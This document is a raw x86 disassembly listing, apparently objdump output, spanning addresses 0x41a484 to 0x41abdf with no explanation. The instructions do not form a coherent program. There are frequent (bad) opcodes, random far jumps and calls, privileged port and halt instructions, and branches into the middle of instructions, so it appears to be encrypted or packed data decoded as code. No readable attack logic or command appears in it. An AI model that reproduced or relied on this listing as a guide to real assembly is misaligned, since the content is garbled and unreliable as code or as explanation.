  41a484:	mov    ds:0xf59c9d96,eax
  41a489:	lea    eax,[ecx]
  41a48b:	mov    ch,0x81
  41a48d:	js     0x41a4f1
  41a48f:	xor    BYTE PTR [esi],bl
  41a491:	xchg   ebx,eax
  41a492:	scas   eax,DWORD PTR es:[edi]
  41a493:	push   0x36
  41a495:	idiv   dh
  41a497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a498:	push   0x2b
  41a49a:	enter  0xc242,0xa3
  41a49e:	nop
  41a49f:	xchg   edx,eax
  41a4a0:	jle    0x41a431
  41a4a2:	add    eax,0x84ecc475
  41a4a7:	mov    al,0xf5
  41a4a9:	cld    
  41a4aa:	hlt    
  41a4ab:	jns    0x41a431
  41a4ad:	daa    
  41a4ae:	inc    ebp
  41a4af:	ds loop 0x41a4e7
  41a4b2:	cmp    BYTE PTR cs:[ebx],0x2d
  41a4b6:	leave  
  41a4b7:	sub    edi,DWORD PTR [ebx+0x12]
  41a4ba:	push   es
  41a4bb:	inc    ebp
  41a4bc:	sbb    edi,DWORD PTR [eax-0x62]
  41a4bf:	dec    edx
  41a4c0:	das    
  41a4c1:	js     0x41a44c
  41a4c3:	fcmovnbe st,st(3)
  41a4c5:	int    0x1d
  41a4c7:	outs   dx,BYTE PTR ds:[esi]
  41a4c8:	retf   0x7eb6
  41a4cb:	fldcw  WORD PTR [ebx-0x63]
  41a4ce:	adc    BYTE PTR [ebx+0x407b4bf4],bl
  41a4d4:	fadd   DWORD PTR [edx+0x7cd92845]
  41a4da:	xchg   esi,eax
  41a4db:	enter  0x6722,0xbe
  41a4df:	aad    0x26
  41a4e1:	cmp    ah,BYTE PTR [esi]
  41a4e3:	pop    edx
  41a4e4:	mov    eax,ds:0xf0fbe568
  41a4ea:	cs pop esp
  41a4ec:	mov    esp,0x631795ef
  41a4f1:	addr16 in al,0x7a
  41a4f4:	inc    ebx
  41a4f5:	call   0x5adaad74
  41a4fa:	test   BYTE PTR ds:[edx+0x7a],bl
  41a4fe:	lea    eax,[ebp+0x4a]
  41a501:	inc    ecx
  41a502:	gs inc edx
  41a504:	popa   
  41a505:	jmp    0x3c0:0xa6c0a1c6
  41a50c:	jge    0x41a553
  41a50e:	xchg   ebx,eax
  41a50f:	cmp    esi,DWORD PTR [esi-0x13]
  41a512:	fcomp  DWORD PTR [esi+0x68]
  41a515:	test   eax,0x77389842
  41a51a:	push   esi
  41a51b:	fcmovnb st,st(3)
  41a51d:	and    DWORD PTR [ebp+0x68],0x41
  41a521:	ret    0xddb4
  41a524:	inc    esi
  41a525:	mov    ebx,0x1497e0ce
  41a52a:	nop
  41a52b:	clc    
  41a52c:	adc    ebp,esi
  41a52e:	fisubr DWORD PTR [eax]
  41a530:	ret    
  41a531:	or     DWORD PTR [edx-0x5550fa15],esp
  41a537:	inc    eax
  41a538:	mov    eax,ds:0x6d6b1a77
  41a53d:	sub    DWORD PTR [ecx],eax
  41a53f:	or     bh,bl
  41a541:	push   ds
  41a542:	xchg   esp,eax
  41a543:	shl    BYTE PTR [edx-0x2fb6101a],1
  41a549:	adc    al,0x51
  41a54b:	scas   eax,DWORD PTR es:[edi]
  41a54c:	mov    ebx,DWORD PTR [ecx+0x4f5b102b]
  41a552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a553:	jge    0x41a4d5
  41a555:	lods   al,BYTE PTR ds:[esi]
  41a556:	adc    DWORD PTR [esi],0x93be2cab
  41a55c:	loop   0x41a5b3
  41a55e:	(bad)
  41a562:	dec    esp
  41a563:	(bad)  
  41a564:	daa    
  41a565:	sbb    BYTE PTR [esi],dh
  41a567:	mov    ecx,eax
  41a569:	rcr    ch,0xf2
  41a56c:	lods   eax,DWORD PTR ds:[esi]
  41a56d:	mov    eax,0x6cf998f5
  41a572:	fwait
  41a573:	test   DWORD PTR [edi+ebp*8+0x49],esi
  41a577:	add    bh,BYTE PTR [ebx+0x314abc84]
  41a57d:	repnz adc esi,0xffffff84
  41a581:	mov    bh,0x14
  41a583:	and    cl,BYTE PTR [esi]
  41a585:	jecxz  0x41a56b
  41a587:	push   edi
  41a588:	cmp    DWORD PTR [edi],0xc04d5b45
  41a58e:	jl     0x41a585
  41a590:	sbb    BYTE PTR [ebp+0x38],0xaf
  41a594:	in     al,0x24
  41a596:	xchg   esp,eax
  41a597:	sub    al,0x1b
  41a599:	xor    DWORD PTR [ebp-0x79],ecx
  41a59c:	arpl   bx,bp
  41a59e:	sbb    BYTE PTR [edi-0x6d1363d3],ah
  41a5a4:	ja     0x41a5b2
  41a5a6:	cmp    ebp,DWORD PTR [edi+ecx*8]
  41a5a9:	std    
  41a5aa:	into   
  41a5ab:	jns    0x41a5d1
  41a5ad:	xchg   edx,eax
  41a5ae:	fcompp 
  41a5b0:	mov    edi,0xdd1f7f39
  41a5b5:	ss adc al,0x2a
  41a5b8:	xor    eax,0x98863786
  41a5bd:	sahf   
  41a5be:	mov    dl,0xb3
  41a5c0:	dec    ebp
  41a5c1:	stos   BYTE PTR es:[edi],al
  41a5c2:	ds aas 
  41a5c4:	sbb    BYTE PTR [esp+ecx*2+0x44],0xe9
  41a5c9:	sub    DWORD PTR [ebx],eax
  41a5cb:	fst    DWORD PTR [esi+edi*1+0x15c0a405]
  41a5d2:	and    al,0xa0
  41a5d4:	scas   eax,DWORD PTR es:[edi]
  41a5d5:	jo     0x41a64d
  41a5d7:	call   0x66b52927
  41a5dc:	dec    esi
  41a5dd:	sbb    BYTE PTR [ecx-0x108e0fab],ch
  41a5e3:	neg    BYTE PTR [edi-0x3f]
  41a5e6:	jl     0x41a64c
  41a5e8:	mov    ch,0xe0
  41a5ea:	pop    esi
  41a5eb:	xchg   edi,eax
  41a5ec:	or     BYTE PTR [edx-0xd03bd4c],cl
  41a5f2:	mov    ?,WORD PTR [edi-0x11]
  41a5f5:	pop    ds
  41a5f6:	sub    al,0xd5
  41a5f8:	xchg   ebx,eax
  41a5f9:	js     0x41a5bc
  41a5fb:	mov    eax,ds:0x7cdd9862
  41a600:	xchg   ebx,eax
  41a601:	fld    st(5)
  41a603:	sub    al,0xa3
  41a605:	mov    esp,0x13a0e640
  41a60a:	push   ds
  41a60b:	sbb    al,ch
  41a60d:	sbb    ebx,DWORD PTR [ebx+0x2a]
  41a610:	retf   
  41a611:	pop    es
  41a612:	xchg   ebp,eax
  41a613:	cmp    al,bh
  41a615:	scas   eax,DWORD PTR es:[edi]
  41a616:	and    dh,0xd4
  41a619:	aaa    
  41a61a:	jnp    0x41a69b
  41a61c:	sbb    eax,0xb8d17705
  41a621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a622:	mov    edi,0xbb4d6810
  41a627:	lahf   
  41a628:	sub    dl,al
  41a62a:	ins    DWORD PTR es:[edi],dx
  41a62b:	ins    DWORD PTR es:[edi],dx
  41a62c:	js     0x41a5f8
  41a62e:	daa    
  41a62f:	test   BYTE PTR [ebp+0x35b2db3a],cl
  41a635:	mov    ds:0x2e830c8b,eax
  41a63a:	ror    dl,0x4
  41a63d:	int    0xa6
  41a63f:	ret    
  41a640:	inc    ebx
  41a641:	sub    eax,0x32111623
  41a646:	jecxz  0x41a60e
  41a648:	pop    ds
  41a649:	leave  
  41a64a:	mov    ah,0x68
  41a64c:	push   es
  41a64d:	ret    0x5256
  41a650:	sub    DWORD PTR [ecx],ebp
  41a652:	dec    eax
  41a653:	mov    esi,0x5de77cd4
  41a658:	jae    0x41a5e8
  41a65a:	xor    DWORD PTR [esi+0x16],edi
  41a65d:	lahf   
  41a65e:	jecxz  0x41a6dc
  41a660:	push   ss
  41a661:	fadd   QWORD PTR [esi-0xf]
  41a664:	dec    ecx
  41a665:	retf   0x7b7d
  41a668:	iret   
  41a669:	pusha  
  41a66a:	pop    es
  41a66b:	cli    
  41a66c:	add    dh,BYTE PTR [edx+0x7082615f]
  41a672:	loopne 0x41a6f1
  41a674:	xchg   esi,eax
  41a675:	xor    bh,BYTE PTR [ebx+eiz*1]
  41a678:	jge    0x41a68d
  41a67a:	and    BYTE PTR [ecx+0x1cf7932e],bl
  41a680:	clc    
  41a681:	(bad)  
  41a682:	jne    0x41a6f0
  41a684:	pusha  
  41a685:	dec    ebp
  41a686:	sbb    ch,ch
  41a688:	mov    edi,0x5951fc69
  41a68d:	popa   
  41a68e:	stos   DWORD PTR es:[edi],eax
  41a68f:	(bad)  
  41a690:	jg     0x41a709
  41a692:	jbe    0x41a61d
  41a694:	sahf   
  41a695:	dec    esp
  41a696:	pop    edi
  41a697:	add    al,0xe0
  41a699:	(bad)
  41a69c:	mov    edx,DWORD PTR [ebp+0x73]
  41a69f:	jge    0x41a63a
  41a6a1:	ins    DWORD PTR es:[edi],dx
  41a6a2:	dec    edx
  41a6a3:	ficomp DWORD PTR [ebx]
  41a6a5:	sbb    BYTE PTR [eax-0x9],0x13
  41a6a9:	daa    
  41a6aa:	mov    ds:0x9da54114,eax
  41a6af:	dec    edi
  41a6b0:	call   0xb274:0xb7ecc8c8
  41a6b7:	adc    al,bl
  41a6b9:	out    dx,eax
  41a6ba:	mov    cl,0xdc
  41a6bc:	test   DWORD PTR [ecx+0x47],ebx
  41a6bf:	xchg   edi,eax
  41a6c0:	stos   BYTE PTR es:[edi],al
  41a6c1:	lock cmc 
  41a6c3:	loopne 0x41a673
  41a6c5:	enter  0x9653,0xd0
  41a6c9:	or     ah,ch
  41a6cb:	daa    
  41a6cc:	pop    ecx
  41a6cd:	pop    esp
  41a6ce:	pop    edx
  41a6cf:	adc    ebp,edx
  41a6d1:	mov    dl,0xd9
  41a6d3:	cmp    edx,DWORD PTR [eax+0xec8748f]
  41a6d9:	jle    0x41a675
  41a6db:	fs ret 
  41a6dd:	pusha  
  41a6de:	xchg   esp,eax
  41a6df:	ins    BYTE PTR es:[edi],dx
  41a6e0:	inc    esp
  41a6e1:	adc    dh,al
  41a6e3:	cmp    al,0x21
  41a6e5:	lods   eax,DWORD PTR ds:[esi]
  41a6e6:	test   al,0x9e
  41a6e8:	test   BYTE PTR [edx+0x55],al
  41a6eb:	(bad)  
  41a6ed:	xchg   ebx,eax
  41a6ee:	mov    ds:0x412e7f8,eax
  41a6f3:	push   ss
  41a6f4:	sub    al,BYTE PTR [ebx+0x28397ae5]
  41a6fa:	jp     0x41a75e
  41a6fc:	imul   edi,DWORD PTR fs:[eax-0x6e],0xffffffef
  41a701:	je     0x41a6b5
  41a703:	ja     0x41a73f
  41a705:	sub    al,0xfa
  41a707:	mov    eax,0x8a1bd22c
  41a70c:	shl    DWORD PTR [edi+0x25fff208],cl
  41a712:	test   eax,0xf3120ed8
  41a717:	xchg   esp,eax
  41a718:	les    ebx,FWORD PTR [edi]
  41a71a:	arpl   WORD PTR [edi],bx
  41a71c:	adc    al,0x30
  41a71e:	mov    ecx,0x55916e19
  41a723:	cmp    ebx,DWORD PTR [ecx]
  41a725:	inc    ecx
  41a726:	jmp    0x41a766
  41a728:	mov    dh,0xb0
  41a72a:	push   esp
  41a72b:	gs (bad) 
  41a72d:	jo     0x41a737
  41a72f:	mov    ah,0xd1
  41a731:	gs ret 0x7f5c
  41a735:	sub    ebp,DWORD PTR [ecx-0x35]
  41a738:	bound  eax,QWORD PTR [ebx+0x14aa0834]
  41a73e:	inc    edi
  41a73f:	arpl   WORD PTR [ebp+0x47669936],cx
  41a745:	aas    
  41a746:	call   0xf62b:0xe5a2a668
  41a74d:	in     al,0x10
  41a74f:	mov    ds:0x9318de12,eax
  41a754:	out    0x77,al
  41a756:	or     al,0x77
  41a758:	inc    ebp
  41a759:	cmp    esp,DWORD PTR [ebx]
  41a75b:	aam    0xb8
  41a75d:	ret    0x6e0c
  41a760:	or     ebx,DWORD PTR [edi-0x2f]
  41a763:	sahf   
  41a764:	dec    edx
  41a765:	pop    eax
  41a766:	test   eax,0x943862c3
  41a76b:	sbb    al,0x1d
  41a76d:	jl     0x41a7c2
  41a76f:	push   esi
  41a770:	sbb    cl,BYTE PTR [esi]
  41a772:	add    DWORD PTR [esi],ecx
  41a774:	and    esp,DWORD PTR [esi+eax*4-0x58]
  41a778:	inc    esi
  41a779:	(bad)  
  41a77a:	shl    al,cl
  41a77c:	fisub  DWORD PTR [esi]
  41a77e:	push   ebp
  41a77f:	xor    eax,0x52f03d2c
  41a784:	sub    edi,DWORD PTR [esi]
  41a786:	and    DWORD PTR [esi-0x4f9cc9f8],edx
  41a78c:	or     edi,esp
  41a78e:	out    0x7c,eax
  41a790:	arpl   WORD PTR [esi+0x4],sp
  41a793:	pop    es
  41a794:	ret    0xca1c
  41a797:	and    al,0x62
  41a799:	mov    ds:0x776fef71,al
  41a79e:	test   eax,0x585a6d4c
  41a7a3:	or     eax,0xf38b0fb6
  41a7a8:	in     eax,0xa0
  41a7aa:	add    eax,0x8e1d79c6
  41a7af:	out    0x83,al
  41a7b1:	mov    esi,0xb66649d2
  41a7b6:	sub    ebp,eax
  41a7b8:	push   ds
  41a7b9:	(bad)
  41a7bd:	inc    esi
  41a7be:	sub    BYTE PTR [eax-0x6e56c7a5],al
  41a7c4:	add    BYTE PTR ds:0x1e6d4baa,0x78
  41a7cb:	loope  0x41a755
  41a7cd:	xor    ebp,DWORD PTR [esi]
  41a7cf:	fdivr  DWORD PTR [ebp-0x3c]
  41a7d2:	loop   0x41a853
  41a7d4:	mov    WORD PTR [ebx],ss
  41a7d6:	in     eax,dx
  41a7d7:	add    esp,DWORD PTR [edi+edx*4]
  41a7da:	out    dx,al
  41a7db:	rcl    BYTE PTR [ebx+0x3967b83b],1
  41a7e1:	cmp    cl,ch
  41a7e3:	mov    edi,0x7bf7cb65
  41a7e8:	pop    es
  41a7e9:	pop    ebx
  41a7ea:	mov    ch,0x6c
  41a7ec:	or     DWORD PTR [ecx+0x1d],edi
  41a7ef:	(bad)  
  41a7f1:	adc    ah,cl
  41a7f3:	xchg   esi,eax
  41a7f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7f5:	call   0xb2980619
  41a7fa:	icebp  
  41a7fb:	pop    ss
  41a7fc:	and    DWORD PTR [esi],0xaed63142
  41a802:	rcl    DWORD PTR [ebp-0x26598d9e],cl
  41a808:	imul   edx,DWORD PTR [esi+esi*1],0xbeacdc39
  41a80f:	jp     0x41a88b
  41a811:	jb     0x41a7f7
  41a813:	inc    DWORD PTR ds:0x67349c39
  41a819:	sbb    al,0x53
  41a81b:	in     eax,0x14
  41a81d:	loop   0x41a82b
  41a81f:	adc    ch,ch
  41a821:	scas   eax,DWORD PTR es:[edi]
  41a822:	pusha  
  41a823:	mov    al,0x5a
  41a825:	dec    eax
  41a826:	inc    ecx
  41a827:	xchg   edi,eax
  41a828:	xchg   BYTE PTR [edi+0x37e0fcc2],dh
  41a82e:	and    ecx,DWORD PTR [esi+0x45]
  41a831:	add    bh,cl
  41a833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a834:	sbb    edi,DWORD PTR [edx+edi*1]
  41a837:	xcrypt-ofb (bad)
  41a838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a839:	outs   dx,DWORD PTR ds:[esi]
  41a83a:	adc    ebp,ebx
  41a83c:	mov    ecx,0x981c4cf5
  41a841:	out    0xe3,al
  41a843:	pop    edx
  41a844:	cmp    esp,DWORD PTR [ebp+0x10]
  41a847:	hlt    
  41a848:	add    ebp,edx
  41a84a:	cld    
  41a84b:	xchg   edi,eax
  41a84c:	sub    BYTE PTR [ecx+0x58],bl
  41a84f:	mov    ebx,0x98b62903
  41a854:	aas    
  41a855:	sbb    eax,0x97e83c11
  41a85a:	loopne 0x41a8b9
  41a85c:	push   edi
  41a85d:	jbe    0x41a8b2
  41a85f:	sar    BYTE PTR [ebx+0xd1e6d43],0xbd
  41a866:	fiadd  DWORD PTR [ecx+edi*8]
  41a869:	sbb    DWORD PTR [ecx],eax
  41a86b:	gs sbb al,al
  41a86e:	jnp    0x41a7f2
  41a870:	jp     0x41a879
  41a872:	fwait
  41a873:	or     BYTE PTR [esi],dh
  41a875:	mov    edi,0xe138c339
  41a87a:	test   BYTE PTR [eax],al
  41a87c:	xchg   DWORD PTR [esp+edx*4],edi
  41a87f:	pushf  
  41a880:	stos   BYTE PTR es:[edi],al
  41a881:	sbb    BYTE PTR [edx+edi*8],ah
  41a884:	adc    eax,0x9f311446
  41a889:	dec    eax
  41a88a:	mov    ecx,DWORD PTR [ebx]
  41a88c:	mov    eax,ds:0x5709b53c
  41a891:	pop    esp
  41a892:	mov    ds:0x4a7d0060,al
  41a897:	cmp    DWORD PTR [edi+0x5],edx
  41a89a:	push   ds
  41a89b:	add    edi,DWORD PTR [ebx]
  41a89d:	call   0x62f5:0x9d142bf
  41a8a4:	push   cs
  41a8a5:	shl    DWORD PTR [eax+0x3f],1
  41a8a8:	jo     0x41a901
  41a8aa:	adc    BYTE PTR [edx-0x36],0xfa
  41a8ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8af:	cwde   
  41a8b0:	stos   DWORD PTR es:[edi],eax
  41a8b1:	(bad)  [edi]
  41a8b3:	mov    bh,0xaa
  41a8b5:	test   al,0x63
  41a8b7:	mov    al,ds:0x113ccb79
  41a8bc:	adc    al,0xbe
  41a8be:	mov    al,ds:0x8b9af56b
  41a8c3:	mov    ecx,edx
  41a8c5:	loop   0x41a8fb
  41a8c7:	test   eax,0x5ee5c019
  41a8cc:	or     cl,bl
  41a8ce:	fistp  DWORD PTR [esp+edi*2]
  41a8d1:	jns    0x442e93df
  41a8d7:	rol    BYTE PTR [eax-0x1f],1
  41a8da:	outs   dx,BYTE PTR ds:[esi]
  41a8db:	les    edx,FWORD PTR [esi+0x22]
  41a8de:	fld    DWORD PTR [esp+ecx*4-0x786b83eb]
  41a8e5:	xchg   esp,eax
  41a8e6:	xor    eax,0xad68e806
  41a8eb:	dec    esp
  41a8ec:	test   eax,0xad74fb0a
  41a8f1:	gs push ebx
  41a8f3:	pop    ss
  41a8f4:	mov    edi,0x61b5fddc
  41a8f9:	mov    esp,0x31597ec4
  41a8fe:	call   0x1b81285b
  41a903:	dec    ecx
  41a904:	and    ebx,DWORD PTR [esi]
  41a906:	xchg   esp,eax
  41a907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a908:	mov    ecx,0xdcba026c
  41a90d:	adc    al,0xb2
  41a90f:	outs   dx,BYTE PTR ds:[esi]
  41a910:	sub    DWORD PTR [ecx+0x4e],ecx
  41a913:	jmp    0x41a939
  41a915:	mov    ds:0xe6f25d82,al
  41a91a:	pop    es
  41a91b:	(bad)  
  41a91c:	or     al,0x8a
  41a91e:	xlat   BYTE PTR ds:[ebx]
  41a91f:	mov    ch,0x82
  41a921:	jp     0x41a8f1
  41a923:	sbb    eax,0x93d27387
  41a928:	clc    
  41a929:	in     al,0x47
  41a92b:	popf   
  41a92c:	sbb    BYTE PTR [ecx-0x193deb6f],bh
  41a932:	xchg   esi,eax
  41a933:	and    eax,0xe52ffbc4
  41a938:	or     ah,BYTE PTR [esp+edx*1]
  41a93b:	adc    esi,DWORD PTR [ebx+0x4c]
  41a93e:	int3   
  41a93f:	rcr    BYTE PTR [edi],1
  41a941:	outs   dx,DWORD PTR ds:[esi]
  41a942:	std    
  41a943:	dec    edx
  41a944:	pop    ss
  41a945:	jno    0x41a907
  41a947:	add    WORD PTR [ecx+0x3c0f318a],dx
  41a94e:	leave  
  41a94f:	(bad)  
  41a950:	jge    0x41a957
  41a952:	clc    
  41a953:	xor    al,0x18
  41a955:	je     0x41a8e6
  41a957:	icebp  
  41a958:	and    eax,0xd08b90eb
  41a95d:	dec    ecx
  41a95e:	mov    DWORD PTR [ebx-0x142f84d0],edx
  41a964:	fwait
  41a965:	or     eax,0xe41ab68a
  41a96a:	cmc    
  41a96b:	out    dx,al
  41a96c:	xchg   ebx,eax
  41a96d:	jmp    0xfaaa:0x8d471b4b
  41a974:	inc    eax
  41a975:	cmp    ecx,DWORD PTR [ecx-0x7]
  41a978:	stc    
  41a979:	scas   eax,DWORD PTR es:[edi]
  41a97a:	test   ebx,ecx
  41a97c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a97d:	inc    edi
  41a97e:	dec    ebx
  41a97f:	(bad)  
  41a980:	nop
  41a981:	lds    edx,FWORD PTR [edx+ebx*1-0x62717a81]
  41a988:	push   0x15d6a20c
  41a98d:	das    
  41a98e:	pop    edx
  41a98f:	dec    eax
  41a990:	xor    edi,DWORD PTR [ebx]
  41a992:	cld    
  41a993:	xor    bl,bl
  41a995:	inc    esi
  41a996:	ins    DWORD PTR es:[edi],dx
  41a997:	or     bl,BYTE PTR [ebp-0x46]
  41a99a:	test   DWORD PTR [ebp-0x1b],ebp
  41a99d:	icebp  
  41a99e:	or     DWORD PTR [eax+ebp*8],esi
  41a9a1:	cmp    esp,DWORD PTR [edx-0x9]
  41a9a4:	clc    
  41a9a5:	sub    eax,0x81e283a0
  41a9aa:	jg     0x41aa18
  41a9ac:	xchg   ebx,eax
  41a9ad:	mov    dh,0x1a
  41a9af:	jne    0x41a94a
  41a9b1:	sbb    DWORD PTR [esi+0x68473080],0xa3ab6739
  41a9bb:	or     BYTE PTR [edi+eiz*8],bl
  41a9be:	push   ebp
  41a9bf:	mov    esp,0x5c6ecf60
  41a9c4:	rol    ebx,1
  41a9c6:	push   esp
  41a9c7:	pop    edx
  41a9c8:	addr16 ja 0x41a9a5
  41a9cb:	mov    dh,0x19
  41a9cd:	shr    bh,cl
  41a9cf:	adc    edi,esi
  41a9d1:	sbb    eax,0x5c9ccffd
  41a9d6:	mov    ecx,DWORD PTR [edi-0x5e]
  41a9d9:	xlat   BYTE PTR ds:[ebx]
  41a9da:	dec    edx
  41a9db:	xor    cl,ah
  41a9dd:	mov    edi,0xd2a686c4
  41a9e2:	jne    0x41a9a8
  41a9e4:	std    
  41a9e5:	addr16 dec eax
  41a9e7:	cld    
  41a9e8:	das    
  41a9e9:	cld    
  41a9ea:	ss dec esp
  41a9ec:	xor    ch,BYTE PTR [esi+0x4f37e447]
  41a9f2:	pop    ds
  41a9f3:	or     DWORD PTR [esi+0x3153c0c],ebp
  41a9f9:	adc    al,0xc6
  41a9fb:	call   0xa19:0x7ff2079
  41aa02:	xor    eax,0x1f779888
  41aa07:	add    al,0x6e
  41aa09:	imul   ebx,edi,0x304f6502
  41aa0f:	push   eax
  41aa10:	mov    eax,ds:0xd52c4dfb
  41aa15:	cmp    eax,0x792f4ba
  41aa1a:	(bad)  
  41aa1b:	sbb    esi,DWORD PTR [esi]
  41aa1d:	or     eax,0x4d6f8f79
  41aa22:	jp     0x41aa68
  41aa24:	adc    eax,0x2b61e2bb
  41aa29:	out    dx,eax
  41aa2a:	hlt    
  41aa2b:	adc    BYTE PTR es:[esi-0x4e],dh
  41aa2f:	jp     0x41a9ba
  41aa31:	dec    esp
  41aa32:	cmp    al,al
  41aa34:	das    
  41aa35:	mov    ecx,0xebe83317
  41aa3a:	mov    WORD PTR [ebx],?
  41aa3c:	dec    ebx
  41aa3d:	pop    esp
  41aa3e:	or     al,BYTE PTR [ebx+0x47]
  41aa41:	mov    esi,0x6b64963b
  41aa46:	rep lods eax,DWORD PTR ds:[esi]
  41aa48:	jmp    0xdb9b:0xcce81b6b
  41aa4f:	fcomp  DWORD PTR [esi+0x5f130b46]
  41aa55:	mov    ecx,0xb598f837
  41aa5a:	sub    ch,BYTE PTR [ecx]
  41aa5c:	ss dec edx
  41aa5e:	or     DWORD PTR [ecx],ecx
  41aa60:	add    eax,0x815d4a9e
  41aa65:	xchg   BYTE PTR [eax],dh
  41aa67:	pop    ds
  41aa68:	out    0xc4,al
  41aa6a:	mov    BYTE PTR [edi-0x74],al
  41aa6d:	push   ebp
  41aa6e:	xor    ecx,0x13b25a22
  41aa74:	pop    ds
  41aa75:	add    dl,al
  41aa77:	rcl    BYTE PTR [ebp+0x523079a9],cl
  41aa7d:	sbb    DWORD PTR [edx-0x5c],edx
  41aa80:	cwde   
  41aa81:	repz dec esp
  41aa83:	jmp    0xc0954ff6
  41aa88:	pushf  
  41aa89:	sub    BYTE PTR [ecx-0x9293479],dl
  41aa8f:	mov    dl,BYTE PTR [esp+eax*4+0xe]
  41aa93:	push   ecx
  41aa94:	nop
  41aa95:	(bad)  
  41aa96:	int3   
  41aa97:	loopne 0x41aa4a
  41aa99:	int3   
  41aa9a:	fcomp  DWORD PTR [esi+0x16]
  41aa9d:	push   edx
  41aa9e:	clc    
  41aa9f:	jno    0x41aa26
  41aaa1:	mov    al,0x75
  41aaa3:	mov    ah,0x49
  41aaa5:	inc    edi
  41aaa6:	icebp  
  41aaa7:	jle    0x41aae1
  41aaa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaaa:	popa   
  41aaab:	pop    ecx
  41aaac:	push   ebx
  41aaad:	or     ebp,edx
  41aaaf:	or     esp,DWORD PTR [ebp+0x57f6664]
  41aab5:	je     0x41aa56
  41aab7:	outs   dx,DWORD PTR ds:[esi]
  41aab8:	cmp    eax,0x2c9ee02e
  41aabd:	pushf  
  41aabe:	or     eax,0x61516f08
  41aac3:	add    al,0x8
  41aac5:	paddusw mm2,QWORD PTR [esi-0x4cee2b1a]
  41aacc:	or     esp,DWORD PTR [esi]
  41aace:	and    al,0xfc
  41aad0:	sbb    ecx,ecx
  41aad2:	mov    esp,DWORD PTR [ebx+edi*8-0x285e2f7b]
  41aad9:	jp     0x41ab4f
  41aadb:	aaa    
  41aadc:	mov    esp,0x2eb0ddfc
  41aae1:	(bad)  
  41aae2:	sub    DWORD PTR [edx+0x24a3a2c4],eax
  41aae8:	mov    edi,0x37d19037
  41aaed:	xor    eax,DWORD PTR [esi-0x71]
  41aaf0:	sti    
  41aaf1:	push   edi
  41aaf2:	das    
  41aaf3:	mov    ecx,0xa35818b4
  41aaf8:	sahf   
  41aaf9:	rep stos DWORD PTR es:[edi],eax
  41aafb:	js     0x41aaf2
  41aafd:	fdivr  QWORD PTR [edi+0x41]
  41ab00:	add    DWORD PTR [edi],edx
  41ab02:	inc    edx
  41ab03:	retf   
  41ab04:	jbe    0x41ab7f
  41ab06:	push   eax
  41ab07:	add    dh,BYTE PTR [edi-0x3b]
  41ab0a:	xchg   DWORD PTR [edi],esp
  41ab0c:	sub    dl,ah
  41ab0e:	popf   
  41ab0f:	xchg   ebp,eax
  41ab10:	sbb    BYTE PTR [edx],dl
  41ab12:	ja     0x41ab56
  41ab14:	add    BYTE PTR [eax],cl
  41ab16:	jmp    0x41ab19
  41ab18:	sar    BYTE PTR [esi-0xc],cl
  41ab1b:	hlt    
  41ab1c:	retf   
  41ab1d:	sub    DWORD PTR [edi-0x41],ecx
  41ab20:	loope  0x41ab81
  41ab22:	cmp    eax,0x31ca05b8
  41ab27:	mov    ebp,edi
  41ab29:	add    ebp,DWORD PTR [edx-0x78]
  41ab2c:	and    al,0x1a
  41ab2e:	clc    
  41ab2f:	imul   edi,DWORD PTR [edx],0x225b37b4
  41ab35:	jecxz  0x41ab17
  41ab37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab38:	dec    ecx
  41ab39:	inc    eax
  41ab3a:	and    al,0x6b
  41ab3c:	scas   al,BYTE PTR es:[edi]
  41ab3d:	add    ah,ch
  41ab3f:	fs push 0x98b8a415
  41ab45:	aas    
  41ab46:	imul   ebx,DWORD PTR ds:0xe1993ff5,0x40d77301
  41ab50:	cld    
  41ab51:	mov    bl,0x79
  41ab53:	stos   DWORD PTR es:[edi],eax
  41ab54:	imul   ebx,DWORD PTR [ebx+0x7dd0ab34],0x4f
  41ab5b:	cmp    BYTE PTR [edi+edx*8-0x2d],0x4b
  41ab60:	test   eax,0x5c112e85
  41ab65:	pop    edx
  41ab66:	stos   DWORD PTR es:[edi],eax
  41ab67:	or     al,0x2f
  41ab6a:	idiv   esi
  41ab6c:	and    eax,0x5336d125
  41ab71:	mov    eax,0xf0f39920
  41ab76:	loope  0x41ab6c
  41ab78:	ja     0x41ab39
  41ab7a:	jmp    0x41ab12
  41ab7c:	xor    DWORD PTR [edx-0x6e],esi
  41ab7f:	out    dx,eax
  41ab80:	cdq    
  41ab81:	sar    DWORD PTR [eax-0x6a],1
  41ab84:	(bad)  
  41ab85:	repz addr16 xchg ebp,eax
  41ab88:	jns    0x41ab32
  41ab8a:	adc    BYTE PTR [ecx+0x3f],0xb8
  41ab8e:	fsubr  st(7),st
  41ab90:	adc    BYTE PTR [ecx+ecx*8+0x45],al
  41ab94:	mov    eax,ds:0x8ab3638d
  41ab99:	cmp    al,0x70
  41ab9b:	jmp    0x3abf:0x3fc5068c
  41aba2:	or     DWORD PTR [edx+0x6d],eax
  41aba5:	xor    bh,BYTE PTR [ebx-0x40e1488b]
  41abab:	pop    edx
  41abac:	jbe    0x41ab98
  41abae:	ficomp WORD PTR [eax+eax*4]
  41abb1:	ficom  WORD PTR [esp+ebp*1+0x16]
  41abb5:	mov    bl,0xa
  41abb7:	push   esi
  41abb8:	les    esp,FWORD PTR [ecx+0x79]
  41abbb:	mov    bh,0xe0
  41abbd:	dec    ecx
  41abbe:	xor    BYTE PTR [ebx],cl
  41abc0:	loope  0x41ac1f
  41abc2:	sbb    ecx,ebp
  41abc4:	sbb    eax,0x2426fc93
  41abc9:	push   edi
  41abca:	fld    QWORD PTR [ebp+ebx*4+0x5d]
  41abce:	retf   
  41abcf:	outs   dx,DWORD PTR ds:[esi]
  41abd0:	out    dx,eax
  41abd1:	xchg   ah,cl
  41abd3:	push   ebp
  41abd4:	sub    cl,BYTE PTR [ebx]
  41abd6:	mov    edx,0x2cb7d847
  41abdb:	ins    BYTE PTR es:[edi],dx
  41abdc:	jae    0x41ac5a
  41abde:	inc    esp
  41abdf:	ficomp DWORD PTR [esi+0x22]
